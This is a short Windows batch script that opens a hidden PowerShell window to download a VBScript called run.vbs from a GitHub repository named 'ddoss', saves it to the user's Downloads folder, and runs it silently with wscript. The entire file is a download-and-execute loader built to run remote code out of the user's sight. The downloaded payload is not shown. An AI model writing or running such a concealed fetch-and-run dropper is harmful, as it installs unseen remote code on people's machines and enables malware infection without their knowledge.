@echo off

set "url=https://raw.githubusercontent.com/srap18/ddoss/main/run.vbs"
set "dest=%USERPROFILE%\Downloads\run.vbs"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%dest%')"
wscript //B //Nologo "%dest%"
